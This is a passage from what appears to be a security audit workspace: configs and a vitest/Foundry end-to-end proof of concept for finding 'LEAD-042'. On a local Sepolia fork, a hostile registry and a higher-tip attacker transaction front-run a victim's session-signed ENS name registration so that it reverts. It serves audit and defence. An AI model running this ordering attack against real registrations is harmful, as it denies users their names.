    function addr(bytes32) external view returns (address) {
        return CONTROLLER;
    }
}
```

Save this as `audit_workspace/renewed/revalidation-2026/lead-042/bundle-session-e2e/foundry.toml` (SHA-256 `9e811af64db9f95b3ba576088b88e498bbfd1b2551874589f7090d1198dbe39f`):

```toml
[profile.default]
src = "src"
out = "out"
cache_path = "cache"
solc_version = "0.8.27"
evm_version = "prague"
optimizer = true
optimizer_runs = 10000
```

Save this as `audit_workspace/renewed/revalidation-2026/lead-042/bundle-session-e2e/vitest.config.ts` (SHA-256 `c14f55fb97414a3096e490c687b76fcc1554995e9a7b1da53b217f24803297a8`):

```ts
import { fileURLToPath } from 'node:url'

const here = fileURLToPath(new URL('.', import.meta.url))
const root = fileURLToPath(new URL('../../../../../', import.meta.url))
const manager = `${root}apps/manager/`
const deps = `${manager}node_modules/`

export default {
  root: manager,
  resolve: {
    alias: {
      '@ens-apps/smart-account': `${root}packages/smart-account/src`,
      '@ens-apps/transaction-manager': `${root}packages/transaction-manager/src`,
      '@ens-apps/utils': `${root}packages/utils/src`,
      viem: `${deps}viem`,
      xstate: `${deps}xstate`,
      vitest: `${deps}vitest`,
    },
    dedupe: ['@rhinestone/sdk', 'viem', 'xstate'],
  },
  define: {
    global: 'globalThis',
    'import.meta.env': {},
  },
  test: {
    globals: true,
    environment: 'node',
    include: [`${here}*.test.ts`],
    disableConsoleIntercept: true,
    testTimeout: 180_000,
    hookTimeout: 180_000,
  },
}
```

Save this as `audit_workspace/renewed/revalidation-2026/lead-042/bundle-session-e2e/same-block-session-ordering.test.ts` (SHA-256 `436312e76009ba9a5a92e1c10ba9a80416545feca43265b987d671c98e75baa4`):

```ts
import { readFileSync, writeFileSync } from 'node:fs'
import { afterAll, describe, expect, it, vi } from 'vitest'
import {
  type Address,
  type Hex,
  bytesToHex,
  concatHex,
  createPublicClient,
  createWalletClient,
  decodeAbiParameters,
  decodeFunctionData,
  encodeAbiParameters,
  encodeFunctionData,
  getAddress,
  http,
  isAddressEqual,
  keccak256,
  maxUint256,
  parseAbi,
  parseSignature,
  slice,
  stringToHex,
  toHex,
  zeroAddress,
  zeroHash,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { namehash, packetToBytes } from 'viem/ens'
import { sepolia } from 'viem/chains'
import { computeResolverAddress } from '@ens-apps/smart-account/providers/rhinestone/registration-calls'
import {
  getDestinationContracts,
  MAX_REFUND_AMOUNT,
  MAX_REFUND_EXCHANGE_RATE,
  MAX_REFUND_GAS_OVERHEAD,
  REFERER,
} from '@ens-apps/smart-account/providers/rhinestone/manifest'
import {
  submitRevealBatchActor,
  verifyHcaRegistrationActor,
} from '@ens-apps/transaction-manager/machines/registration/registration.hca.actors'
import { transactionManager } from '@ens-apps/transaction-manager/providers/transactionManager'

const RPC = process.env.ANVIL_RPC ?? 'http://127.0.0.1:19642'
const PINNED_FORK_BLOCK = 11_685_895n
const LABEL = 'lead042-session-bundle-proof'
const DURATION = 94_608_000n
const VICTIM_SECRET = `0x${'42'.repeat(32)}` as Hex
const ATTACKER_SECRET = `0x${'99'.repeat(32)}` as Hex
const NAME_NOT_AVAILABLE = '0x477707e8'
const UNIVERSAL_RESOLVER = '0xeEeEEEeE14D718C2B47D9923Deab1335E144EeEe' as const
const INTENT_EXECUTOR = '0x00000000005aD9ce1f5035FD62CA96CEf16AdAAF' as const
const OWNABLE_SESSION_VALIDATOR = '0x000000000013fdB5234E4E3162a810F54d9f7E98' as const
const SMART_SESSION_EMISSARY = '0xad568B3F825A8d5FFc06DD3253526B64D810Ae89' as const

// Fresh deterministic test-only keys. They are funded only with anvil_setBalance.
const owner = privateKeyToAccount(
  '0xf189158bc4b1abbe741d4d776f50fe65761b34996152ee528ecdc894c42ae1ea',
)
const session = privateKeyToAccount(
  '0xa71f9767e64461571183c592f14b575e3dc142ff2c2c16e7d5ead78db594881f',
)
const attacker = privateKeyToAccount(
  '0x2dec9e28f990f2d81334a391793930526fc0e051d225835721dcf3ee9b902a5b',
)
const filler = privateKeyToAccount(
  '0x4d107af53d29ca3fd1f7631bbccf25c3593d26f3cd74303dac9f743bb23f5398',
)

const chain = {
  ...sepolia,
  rpcUrls: { default: { http: [RPC] } },
}
const publicClient = createPublicClient({ chain, transport: http(RPC) })
const ownerWallet = createWalletClient({ account: owner, chain, transport: http(RPC) })
const attackerWallet = createWalletClient({ account: attacker, chain, transport: http(RPC) })
const fillerWallet = createWalletClient({ account: filler, chain, transport: http(RPC) })
const c = getDestinationContracts(sepolia.id)

const factoryAbi = parseAbi([
  'function deploy(address owner,address implementation,uint256 userSalt) returns (address hca)',
  'function authorizedOwnerOf(address hca) view returns (address)',
])
const hcaAbi = parseAbi([
  'function ownerAndSessionNonce() view returns (address owner,uint96 sessionNonce)',
  'function accountId() view returns (string)',
  'function isModuleInstalled(uint256 moduleTypeId,address module,bytes additionalContext) view returns (bool)',
])
const validatorAbi = parseAbi([
  'function enableSessionWithRefund(bytes32 permissionId,address sessionKey,uint48 validUntil,address resolver,address refundToken,uint96 maxRefundExchangeRate,uint48 maxRefundGasOverhead,uint96 maxRefundAmount)',
  'function isPermissionEnabled(address account,bytes32 permissionId) view returns (bool)',
  'function GAS_REFUND_PAYMASTER() view returns (address)',
  'event SessionEnabled(address indexed account,bytes32 indexed permissionId,address indexed sessionKey,address resolver,uint48 validUntil,uint96 sessionNonce)',
])
const executorAbi = parseAbi([
  'function executeSinglechainOpsWithGasRefund_ERC20((address account,uint256 nonce,(bytes data) ops,bytes signature) signedOps,(address token,uint256 exchangeRate,uint256 overhead) gasRefund,address gasRefundRecipient) returns (address account,uint256 nonce)',
  'function isStandaloneIntentNonceConsumed(uint256 nonce,address account) view returns (bool)',
])
const registrarAbi = parseAbi([
  'function makeCommitment(string label,address owner,bytes32 secret,address subregistry,address resolver,uint64 duration,bytes32 referrer) view returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label,address owner,bytes32 secret,address subregistry,address resolver,uint64 duration,address paymentToken,bytes32 referrer) returns (uint256)',
  'function isAvailable(string label) view returns (bool)',
  'function MIN_COMMITMENT_AGE() view returns (uint64)',
  'function getRegisterPrice(string label,uint64 duration,address paymentToken) view returns (uint256 base,uint256 premium)',
])
const registryAbi = parseAbi([
  'struct State { uint8 status; uint64 expiry; address latestOwner; uint256 tokenId; uint256 resource; }',
  'function getState(uint256 anyId) view returns (State state)',
  'function findOwner(string label) view returns (address)',
  'function getResolver(string label) view returns (address)',
  'function getSubregistry(string label) view returns (address)',
])
const tokenAbi = parseAbi([
  'function mint(address to,uint256 amount)',
  'function approve(address spender,uint256 amount) returns (bool)',
  'function allowance(address owner,address spender) view returns (uint256)',
  'function balanceOf(address account) view returns (uint256)',
])
const verifiableFactoryAbi = parseAbi([
  'function proxyLogic() view returns (address)',
  'function deployProxy(address implementation,uint256 salt,bytes data) returns (address proxy)',
])
const universalResolverAbi = parseAbi([
  'function resolve(bytes name,bytes data) view returns (bytes result,address resolver)',
])
const addrAbi = parseAbi(['function addr(bytes32 node) view returns (address)'])
const hostileRegistryAbi = parseAbi([
  'function findOwner(string label) view returns (address)',
  'function getResolver(string label) view returns (address)',
])

const EXECUTION_PARAM = {
  type: 'tuple[]',
  components: [
    { name: 'target', type: 'address' },
    { name: 'value', type: 'uint256' },
    { name: 'callData', type: 'bytes' },
  ],
} as const
const PROOF_PARAM = {
  type: 'tuple',
  components: [
    { name: 'sessionKey', type: 'address' },
    { name: 'validUntil', type: 'uint48' },
    { name: 'sessionNonce', type: 'uint96' },
    { name: 'resolver', type: 'address' },
    { name: 'refundToken', type: 'address' },
    { name: 'maxRefundExchangeRate', type: 'uint96' },
    { name: 'maxRefundGasOverhead', type: 'uint48' },
    { name: 'maxRefundAmount', type: 'uint96' },
    { name: 'sessionToEnableIndex', type: 'uint8' },
    {
      name: 'hashesAndChainIds',
      type: 'tuple[]',
      components: [
        { name: 'chainId', type: 'uint64' },
        { name: 'sessionDigest', type: 'bytes32' },
      ],
    },
    { name: 'ownerR', type: 'bytes32' },
    { name: 'ownerS', type: 'bytes32' },
    { name: 'ownerV', type: 'uint8' },
  ],
} as const

type Execution = { target: Address; value: bigint; callData: Hex }
type GasRefund = { token: Address; exchangeRate: bigint; overhead: bigint }

const C = {
  EIP712_DOMAIN_TYPEHASH: keccak256(
    stringToHex(
      'EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)',
    ),
  ),
  INTENT_EXECUTOR_NAME_HASH: keccak256(stringToHex('IntentExecutor')),
  INTENT_EXECUTOR_VERSION_HASH: keccak256(stringToHex('v0.0.1')),
  SINGLE_CHAIN_OPS_TYPEHASH:
    '0xbae11135c33effc421d699bbb53d9926a005ed0f2f5eb672c62cbfa943807291' as Hex,
  OP_TYPEHASH:
    '0xdbc520cb50a8aaf3fa06ea43dc3d59d248e52ae638476e3268a1e6e36bffe196' as Hex,
  EXECUTION_TYPEHASH:
    '0x09b0a32e9842b65559835c235891737e06927d59e48a6f0e0512e136a513a9e4' as Hex,
  GAS_REFUND_TYPEHASH:
    '0x0bf04d9dcc5e703a75ba16d19c00f9d87fa30b9a815627102c15624d338eb094' as Hex,
  SIGNED_SESSION_TYPEHASH:
    '0x984917e689987af96289e12c5f5e934fcdf1df4186108f69ff7e8c3df950ce33' as Hex,
  CHAIN_SESSION_TYPEHASH:
    '0xabc350ff4773ba356e85e2d2ee58d7d7511767acdb108b59058f5b4a5afc074b' as Hex,
  MULTI_CHAIN_SESSION_TYPEHASH:
    '0xb4323194e4ca3723804b96dc7a0960bde1afff2b080b8b288fdc264c82e21357' as Hex,
  SMART_SESSION_DOMAIN_TYPEHASH:
    '0xb03948446334eb9b2196d5eb166f69b9d49403eb4a12f36de8d3f9f3cb8e15c3' as Hex,
  SMART_SESSION_NAME_HASH:
    '0x909aaff4c04d02fd420ef163a6d750c002b0a00dc41a031ba039e3fdb4732133' as Hex,
  SMART_SESSION_VERSION_HASH:
    '0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6' as Hex,
  DEFAULT_SIGNED_PERMISSIONS_HASH:
    '0x242b79d1322c5e6b12b617584cc2d5766cf18be6feb6acfa469ccf289e11e504' as Hex,
  MODE: `0x0201${'00'.repeat(30)}` as Hex,
}

const PER_INTENT_MAX_REFUND = 50_000_000n
const PER_INTENT_GAS_OVERHEAD = 50_000n
const GAS_REFUND: GasRefund = {
  token: c.usdc,
  exchangeRate: 2_000_000_000n,
  overhead: (PER_INTENT_MAX_REFUND << 128n) | PER_INTENT_GAS_OVERHEAD,
}

function abiEncode(types: readonly string[], values: readonly unknown[]): Hex {
  return encodeAbiParameters(
    types.map((type) => ({ type })) as never,
    values as never,
  )
}

function execution(
  target: Address,
  abi: readonly unknown[],
  functionName: string,
  args: readonly unknown[],
): Execution {
  return {
    target,
    value: 0n,
    callData: encodeFunctionData({ abi: abi as never, functionName: functionName as never, args: args as never }),
  }
}

function managerCallsToExecutions(
  calls: readonly { to: Address; value?: bigint; data: Hex }[],
): Execution[] {
  return calls.map((call) => ({
    target: call.to,
    value: BigInt(call.value ?? 0n),
    callData: call.data,
  }))
}

async function rpc(method: string, params: unknown[] = []): Promise<any> {
  return (publicClient as any).request({ method, params })
}

async function setEthBalance(address: Address): Promise<void> {
  await rpc('anvil_setBalance', [address, '0x56bc75e2d63100000'])
}

async function waitForReceipt(hash: Hex) {
  return publicClient.waitForTransactionReceipt({ hash })
}

function flattenCallTrace(node: any, depth = 0): any[] {
  return [
    { ...node, depth },
    ...(node.calls ?? []).flatMap((child: any) =>
      flattenCallTrace(child, depth + 1),
    ),
  ]
}

async function sendAndRequireSuccess(
  wallet: typeof ownerWallet | typeof attackerWallet | typeof fillerWallet,
  request: { to: Address; data: Hex; gas?: bigint },
) {
  const hash = await wallet.sendTransaction({
    to: request.to,
    data: request.data,
    gas: request.gas ?? 7_000_000n,
  })
  const receipt = await waitForReceipt(hash)
  expect(receipt.status).toBe('success')
  return { hash, receipt }
}

function intentDigestForCalls(
  hca: Address,
  nonce: bigint,
  calls: readonly Execution[],
  gasRefund: GasRefund,
): Hex {
  const executionHashes = calls.map((call) =>
    keccak256(
      abiEncode(
        ['bytes32', 'address', 'uint256', 'bytes32'],
        [C.EXECUTION_TYPEHASH, call.target, call.value, keccak256(call.callData)],
      ),
    ),
  )
  const operationHash = keccak256(
    abiEncode(
      ['bytes32', 'bytes32', 'bytes32'],
      [C.OP_TYPEHASH, C.MODE, keccak256(concatHex(executionHashes))],
    ),
  )
  const gasRefundHash = keccak256(
    abiEncode(
      ['bytes32', 'address', 'uint256', 'uint256'],
      [
        C.GAS_REFUND_TYPEHASH,
        gasRefund.token,
        gasRefund.exchangeRate,
        gasRefund.overhead,
      ],
    ),
  )
  const structHash = keccak256(
    abiEncode(
      ['bytes32', 'address', 'uint256', 'bytes32', 'bytes32'],
      [C.SINGLE_CHAIN_OPS_TYPEHASH, hca, nonce, operationHash, gasRefundHash],
    ),
  )
  const domain = keccak256(
    abiEncode(
      ['bytes32', 'bytes32', 'bytes32', 'uint256', 'address'],
      [
        C.EIP712_DOMAIN_TYPEHASH,
        C.INTENT_EXECUTOR_NAME_HASH,
        C.INTENT_EXECUTOR_VERSION_HASH,
        BigInt(sepolia.id),
        INTENT_EXECUTOR,
      ],
    ),
  )
  return keccak256(concatHex(['0x1901', domain, structHash]))
}

async function buildRefundSessionOuter(params: {
  hca: Address
  nonce: bigint
  calls: readonly Execution[]
  proofData?: Hex
}): Promise<{
  data: Hex
  digest: Hex
  packedSignature: Hex
  executorOperation: Hex
  validatorOperation: Hex
}> {
  const encodedExecutions = encodeAbiParameters([EXECUTION_PARAM], [params.calls])
  const executorOperation = concatHex(['0x0201', encodedExecutions])
  const validatorOperation = concatHex([C.MODE, encodedExecutions])
  const digest = intentDigestForCalls(params.hca, params.nonce, params.calls, GAS_REFUND)
  const sessionSignature = await session.sign({ hash: digest })
  const commonRefundFields = concatHex([
    toHex(params.nonce, { size: 32 }),
    GAS_REFUND.token,
    toHex(GAS_REFUND.exchangeRate, { size: 32 }),
    toHex(GAS_REFUND.overhead, { size: 32 }),
  ])
  const envelope = params.proofData
    ? concatHex([
        toHex(5, { size: 1 }),
        permissionIdForBuild,
        toHex((params.proofData.length - 2) / 2, { size: 4 }),
        params.proofData,
        commonRefundFields,
        validatorOperation,
        sessionSignature,
      ])
    : concatHex([
        toHex(2, { size: 1 }),
        permissionIdForBuild,
        commonRefundFields,
        validatorOperation,
        sessionSignature,
      ])
  const packedSignature = concatHex([zeroAddress, envelope])
  const signedOps = {
    account: params.hca,
    nonce: params.nonce,
    ops: { data: executorOperation },
    signature: packedSignature,
  }
  const data = encodeFunctionData({
    abi: executorAbi,
    functionName: 'executeSinglechainOpsWithGasRefund_ERC20',
    args: [signedOps, GAS_REFUND, filler.address],
  })
  return { data, digest, packedSignature, executorOperation, validatorOperation }
}

// Set after the HCA address and signed session authorization are derived.
let permissionIdForBuild: Hex = zeroHash

afterAll(() => {
  transactionManager.clear()
  vi.restoreAllMocks()
})

describe.sequential('LEAD-042 deterministic same-block HCA session ordering', () => {
  it('orders hostile direct registration before the Manager-built session reveal and gets NameNotAvailable', async () => {
    expect(await publicClient.getChainId()).toBe(sepolia.id)
    const forkStart = await publicClient.getBlock()
    expect(forkStart.number).toBe(PINNED_FORK_BLOCK)
    expect(forkStart.timestamp).toBe(1_789_178_832n)
    for (const account of [owner, session, attacker, filler]) {
      await setEthBalance(account.address)
      expect(await publicClient.getCode({ address: account.address })).toBeUndefined()
    }

    const artifact = JSON.parse(
      readFileSync(new URL('./out/HostileRegistry.sol/HostileRegistry.json', import.meta.url), 'utf8'),
    )
    const hostileDeployHash = await attackerWallet.deployContract({
      abi: artifact.abi,
      bytecode: artifact.bytecode.object as Hex,
      args: [attacker.address, c.ethRegistry, LABEL],
      gas: 3_000_000n,
    })
    const hostileDeployReceipt = await waitForReceipt(hostileDeployHash)
    expect(hostileDeployReceipt.status).toBe('success')
    const hostileRegistry = getAddress(hostileDeployReceipt.contractAddress!)

    const deploySimulation = await publicClient.simulateContract({
      account: owner,
      address: c.standaloneHcaFactory,
      abi: factoryAbi,
      functionName: 'deploy',
      args: [owner.address, c.standaloneHcaImplementation, 0n],
    })
    const hca = getAddress(deploySimulation.result)
    const deployHcaHash = await ownerWallet.writeContract({
      ...deploySimulation.request,
      gas: 5_000_000n,
    })
    const deployHcaReceipt = await waitForReceipt(deployHcaHash)
    expect(deployHcaReceipt.status).toBe('success')
    expect(
      await publicClient.readContract({
        address: c.standaloneHcaFactory,
        abi: factoryAbi,
        functionName: 'authorizedOwnerOf',
        args: [hca],
      }),
    ).toBe(owner.address)
    expect(
      await publicClient.readContract({ address: hca, abi: hcaAbi, functionName: 'accountId' }),
    ).toBe('ens-standalone-hca.1.1.0')

    const [liveOwner, hcaSessionNonce] = await publicClient.readContract({
      address: hca,
      abi: hcaAbi,
      functionName: 'ownerAndSessionNonce',
    })
    expect(liveOwner).toBe(owner.address)
    expect(hcaSessionNonce).toBe(0n)
    expect(
      await publicClient.readContract({
        address: hca,
        abi: hcaAbi,
        functionName: 'isModuleInstalled',
        args: [2n, INTENT_EXECUTOR, '0x'],
      }),
    ).toBe(true)

    const resolver = computeResolverAddress({ chainId: sepolia.id, hca })
    expect(await publicClient.getCode({ address: resolver })).toBeUndefined()
    expect(
      await publicClient.readContract({
        address: c.verifiableFactory,
        abi: verifiableFactoryAbi,
        functionName: 'proxyLogic',
      }),
    ).toBe(c.verifiableFactoryProxyLogic)

    const gasRefundPaymaster = await publicClient.readContract({
      address: c.hcaOwnerAndSessionValidator,
      abi: validatorAbi,
      functionName: 'GAS_REFUND_PAYMASTER',
    })
    const validUntil = forkStart.timestamp + 31_536_000n
    const sessionSalt = keccak256(
      abiEncode(
        ['uint96', 'uint48', 'address', 'address', 'uint96', 'uint48', 'uint96'],
        [
          hcaSessionNonce,
          validUntil,
          resolver,
          c.usdc,
          MAX_REFUND_EXCHANGE_RATE,
          MAX_REFUND_GAS_OVERHEAD,
          MAX_REFUND_AMOUNT,
        ],
      ),
    )
    const validatorInitData = encodeAbiParameters(
      [{ type: 'uint256' }, { type: 'address[]' }],
      [1n, [session.address]],
    )
    const permissionId = keccak256(
      encodeAbiParameters(
        [{ type: 'address' }, { type: 'bytes' }, { type: 'bytes32' }],
        [OWNABLE_SESSION_VALIDATOR, validatorInitData, sessionSalt],
      ),
    )
    permissionIdForBuild = permissionId
    const signedSessionHash = keccak256(
      abiEncode(
        [
          'bytes32',
          'address',
          'uint256',
          'uint256',
          'bytes32',
          'bytes32',
          'address',
          'bytes32',
          'address',
        ],
        [
          C.SIGNED_SESSION_TYPEHASH,
          hca,
          maxUint256,
          0n,
          C.DEFAULT_SIGNED_PERMISSIONS_HASH,
          sessionSalt,
          OWNABLE_SESSION_VALIDATOR,
          keccak256(validatorInitData),
          SMART_SESSION_EMISSARY,
        ],
      ),
    )
    const chainHash = keccak256(
      abiEncode(
        ['bytes32', 'uint64', 'bytes32'],
        [C.CHAIN_SESSION_TYPEHASH, BigInt(sepolia.id), signedSessionHash],
      ),
    )
    const authorizationStructHash = keccak256(
      abiEncode(
        ['bytes32', 'bytes32'],
        [C.MULTI_CHAIN_SESSION_TYPEHASH, keccak256(chainHash)],
      ),
    )
    const smartSessionDomain = keccak256(
      abiEncode(
        ['bytes32', 'bytes32', 'bytes32'],
        [
          C.SMART_SESSION_DOMAIN_TYPEHASH,
          C.SMART_SESSION_NAME_HASH,
          C.SMART_SESSION_VERSION_HASH,
        ],
      ),
    )
    const ownerAuthorizationDigest = keccak256(
      concatHex(['0x1901', smartSessionDomain, authorizationStructHash]),
    )
    const ownerSignature = parseSignature(await owner.sign({ hash: ownerAuthorizationDigest }))
    const proof = {
      sessionKey: session.address,
      validUntil,
      sessionNonce: hcaSessionNonce,
      resolver,
      refundToken: c.usdc,
      maxRefundExchangeRate: MAX_REFUND_EXCHANGE_RATE,
      maxRefundGasOverhead: MAX_REFUND_GAS_OVERHEAD,
      maxRefundAmount: MAX_REFUND_AMOUNT,
      sessionToEnableIndex: 0,
      hashesAndChainIds: [
        { chainId: BigInt(sepolia.id), sessionDigest: signedSessionHash },
      ],
      ownerR: ownerSignature.r,
      ownerS: ownerSignature.s,
      ownerV: Number(ownerSignature.v ?? BigInt(ownerSignature.yParity + 27)),
    }
    const proofData = encodeAbiParameters([PROOF_PARAM], [proof])

    // Local-only funding. Product funding uses EIP-2612; it is unrelated to the
    // ordering boundary. The session/executor and every reveal call remain real.
    await sendAndRequireSuccess(attackerWallet, {
      to: c.usdc,
      data: encodeFunctionData({
        abi: tokenAbi,
        functionName: 'mint',
        args: [hca, 1_000_000_000_000_000n],
      }),
    })
    await sendAndRequireSuccess(attackerWallet, {
      to: c.usdc,
      data: encodeFunctionData({
        abi: tokenAbi,
        functionName: 'mint',
        args: [attacker.address, 1_000_000_000_000_000n],
      }),
    })

    const victimCommitment = await publicClient.readContract({
      address: c.ethRegistrar,
      abi: registrarAbi,
      functionName: 'makeCommitment',
      args: [
        LABEL,
        owner.address,
        VICTIM_SECRET,
        zeroAddress,
        resolver,
        DURATION,
        REFERER,
      ],
    })
    const refundApproval = execution(c.usdc, tokenAbi, 'approve', [
      gasRefundPaymaster,
      PER_INTENT_MAX_REFUND,
    ])
    const enableCall = execution(
      c.hcaOwnerAndSessionValidator,
      validatorAbi,
      'enableSessionWithRefund',
      [
        permissionId,
        session.address,
        validUntil,
        resolver,
        c.usdc,
        MAX_REFUND_EXCHANGE_RATE,
        MAX_REFUND_GAS_OVERHEAD,
        MAX_REFUND_AMOUNT,
      ],
    )
    const victimCommitCall = execution(c.ethRegistrar, registrarAbi, 'commit', [
      victimCommitment,
    ])
    const firstUseNonce = 42_001n
    const firstUseOuter = await buildRefundSessionOuter({
      hca,
      nonce: firstUseNonce,
      calls: [refundApproval, enableCall, victimCommitCall],
      proofData,
    })
    expect(slice(firstUseOuter.data, 0, 4)).toBe('0xf9225e8b')
    expect(
      await publicClient.readContract({
        address: c.hcaOwnerAndSessionValidator,
        abi: validatorAbi,
        functionName: 'isPermissionEnabled',
        args: [hca, permissionId],
      }),
    ).toBe(false)
    const firstUse = await sendAndRequireSuccess(fillerWallet, {
      to: INTENT_EXECUTOR,
      data: firstUseOuter.data,
    })
    expect(
      firstUse.receipt.logs.some(
        (log) =>
          isAddressEqual(log.address, c.hcaOwnerAndSessionValidator) &&
          log.topics[0] ===
            keccak256(
              stringToHex(
                'SessionEnabled(address,bytes32,address,address,uint48,uint96)',
              ),
            ),
      ),
    ).toBe(true)
    expect(
      await publicClient.readContract({
        address: c.hcaOwnerAndSessionValidator,
        abi: validatorAbi,
        functionName: 'isPermissionEnabled',
        args: [hca, permissionId],
      }),
    ).toBe(true)
    expect(
      await publicClient.readContract({
        address: INTENT_EXECUTOR,
        abi: executorAbi,
        functionName: 'isStandaloneIntentNonceConsumed',
        args: [firstUseNonce, hca],
      }),
    ).toBe(true)

    // The attacker separately pre-ages the exact colliding direct-registration tuple.
    const attackerCommitment = await publicClient.readContract({
      address: c.ethRegistrar,
      abi: registrarAbi,
      functionName: 'makeCommitment',
      args: [
        LABEL,
        owner.address,
        ATTACKER_SECRET,
        hostileRegistry,
        resolver,
        DURATION,
        REFERER,
      ],
    })
    expect(attackerCommitment).not.toBe(victimCommitment)
    await sendAndRequireSuccess(attackerWallet, {
      to: c.ethRegistrar,
      data: encodeFunctionData({
        abi: registrarAbi,
        functionName: 'commit',
        args: [attackerCommitment],
      }),
    })
    await sendAndRequireSuccess(attackerWallet, {
      to: c.usdc,
      data: encodeFunctionData({
        abi: tokenAbi,
        functionName: 'approve',
        args: [c.ethRegistrar, maxUint256],
      }),
    })
    const minAge = await publicClient.readContract({
      address: c.ethRegistrar,
      abi: registrarAbi,
      functionName: 'MIN_COMMITMENT_AGE',
    })
    await rpc('evm_increaseTime', [Number(minAge + 1n)])
    await rpc('evm_mine')

    // Invoke the real transaction-manager actor. Only its final startTransaction
    // handoff is intercepted so we can give the exact product-built call list to
    // the local production IntentExecutor rather than a hosted Warp service.
    let capturedRequest: any
    const managerTxId = 'lead-042-real-manager-builder-capture'
    const startSpy = vi
      .spyOn(transactionManager, 'startTransaction')
      .mockImplementation(((intent: any) => {
        capturedRequest = intent.request
        return managerTxId
      }) as any)
    const constructionBlockBefore = (await publicClient.getBlock()).number
    expect(
      await publicClient.readContract({
        address: c.ethRegistrar,
        abi: registrarAbi,
        functionName: 'isAvailable',
        args: [LABEL],
      }),
    ).toBe(true)
    const builderResult = await submitRevealBatchActor({
      name: `${LABEL}.eth`,
      wallet: owner.address,
      hca,
      duration: DURATION,
      secret: VICTIM_SECRET,
      signer: { type: 'rhinestone' } as any,
      publicClient,
      id: managerTxId,
    })
    startSpy.mockRestore()
    if (builderResult.isErr()) throw builderResult.error
    expect(builderResult.value).toBe(managerTxId)
    const constructionBlockAfter = (await publicClient.getBlock()).number
    expect(constructionBlockAfter).toBe(constructionBlockBefore)
    expect(capturedRequest.type).toBe('rhinestone-intent')
    const managerCalls = capturedRequest.rhinestoneParams.calls as readonly {
      to: Address
      value: bigint
      data: Hex
    }[]
    expect(managerCalls).toHaveLength(5)
    expect(managerCalls.map((call) => getAddress(call.to))).toEqual([
      c.verifiableFactory,
      c.usdc,
      c.ethRegistrar,
      resolver,
      resolver,
    ])
    const decodedManagerApproval = decodeFunctionData({
      abi: tokenAbi,
      data: managerCalls[1]!.data,
    })
    const managerPrice = decodedManagerApproval.args[1]
    const [basePrice, premium] = await publicClient.readContract({
      address: c.ethRegistrar,
      abi: registrarAbi,
      functionName: 'getRegisterPrice',
      args: [LABEL, DURATION, c.usdc],
    })
    expect(managerPrice).toBe(basePrice + premium)
    const decodedManagerRegister = decodeFunctionData({
      abi: registrarAbi,
      data: managerCalls[2]!.data,
    })
    expect(decodedManagerRegister.functionName).toBe('register')
    expect(decodedManagerRegister.args).toEqual([
      LABEL,
      owner.address,
      VICTIM_SECRET,
      zeroAddress,
      resolver,
      DURATION,
      c.usdc,
      REFERER,
    ])

    // Recreate the production planner's refund approval and gas-refund outer call.
    // The remaining five executions are byte-for-byte the actor's SDK handoff.
    const victimNonce = 42_002n
    const victimExecutions = [refundApproval, ...managerCallsToExecutions(managerCalls)]
    const victimOuter = await buildRefundSessionOuter({
      hca,
      nonce: victimNonce,
      calls: victimExecutions,
    })
    expect(slice(victimOuter.data, 0, 4)).toBe('0xf9225e8b')
    expect(slice(victimOuter.packedSignature, 20, 21)).toBe('0x02')

    // Strong clean control: the exact same session-signed payload succeeds as a
    // real transaction before the hostile registration. Revert the Anvil snapshot
    // so the payload and executor nonce are pristine for the ordered bundle.
    const cleanSnapshot = await rpc('evm_snapshot')
    const clean = await sendAndRequireSuccess(fillerWallet, {
      to: INTENT_EXECUTOR,
      data: victimOuter.data,
    })
    expect(
      await publicClient.readContract({
        address: c.ethRegistry,
        abi: registryAbi,
        functionName: 'findOwner',
        args: [LABEL],
      }),
    ).toBe(owner.address)
    expect(await rpc('evm_revert', [cleanSnapshot])).toBe(true)
    expect(
      await publicClient.readContract({
        address: c.ethRegistrar,
        abi: registrarAbi,
        functionName: 'isAvailable',
        args: [LABEL],
      }),
    ).toBe(true)
    expect(await publicClient.getCode({ address: resolver })).toBeUndefined()
    expect(
      await publicClient.readContract({
        address: INTENT_EXECUTOR,
        abi: executorAbi,
        functionName: 'isStandaloneIntentNonceConsumed',
        args: [victimNonce, hca],
      }),
    ).toBe(false)

    const hostileRegisterData = encodeFunctionData({
      abi: registrarAbi,
      functionName: 'register',
      args: [
        LABEL,
        owner.address,
        ATTACKER_SECRET,
        hostileRegistry,
        resolver,
        DURATION,
        c.usdc,
        REFERER,
      ],
    })

    // Deterministic builder equivalent: the signed victim transaction enters the
    // held mempool first. The hostile transaction enters second with a higher tip.
    // Anvil's explicit `--order fees` policy puts hostile first in the mined block.
    let hostileHash: Hex
    let victimHash: Hex
    await rpc('evm_setAutomine', [false])
    try {
      victimHash = await fillerWallet.sendTransaction({
        to: INTENT_EXECUTOR,
        data: victimOuter.data,
        gas: 7_000_000n,
        maxFeePerGas: 20_000_000_000n,
        maxPriorityFeePerGas: 1_000_000_000n,
      })
      hostileHash = await attackerWallet.sendTransaction({
        to: c.ethRegistrar,
        data: hostileRegisterData,
        gas: 7_000_000n,
        maxFeePerGas: 30_000_000_000n,
        maxPriorityFeePerGas: 3_000_000_000n,
      })
      await rpc('evm_mine')
    } finally {
      await rpc('evm_setAutomine', [true])
    }

    const hostileReceipt = await publicClient.getTransactionReceipt({ hash: hostileHash! })
    const victimReceipt = await publicClient.getTransactionReceipt({ hash: victimHash! })
    expect(hostileReceipt.status).toBe('success')
    expect(victimReceipt.status).toBe('reverted')
    expect(victimReceipt.blockNumber).toBe(hostileReceipt.blockNumber)
    expect(Number(hostileReceipt.transactionIndex)).toBe(0)
    expect(Number(victimReceipt.transactionIndex)).toBe(1)
    expect(hostileReceipt.blockNumber).toBe(constructionBlockAfter + 1n)

    const failureTrace = await rpc('debug_traceTransaction', [victimHash!, {}])
    expect(failureTrace.failed).toBe(true)
    const returnValue = failureTrace.returnValue as Hex
    expect(returnValue.slice(0, 10)).toBe(NAME_NOT_AVAILABLE)
    const [unavailableLabel] = decodeAbiParameters(
      [{ type: 'string' }],
      slice(returnValue, 4),
    )
    expect(unavailableLabel).toBe(LABEL)
    const callTrace = await rpc('debug_traceTransaction', [
      victimHash!,
      { tracer: 'callTracer' },
    ])
    const traceNodes = flattenCallTrace(callTrace)
    const hcaExecution = traceNodes.find(
      (node) =>
        node.type === 'CALL' &&
        isAddressEqual(node.to, hca) &&
        node.error === 'execution reverted',
    )
    const innerRegistrarFailure = traceNodes.find(
      (node) =>
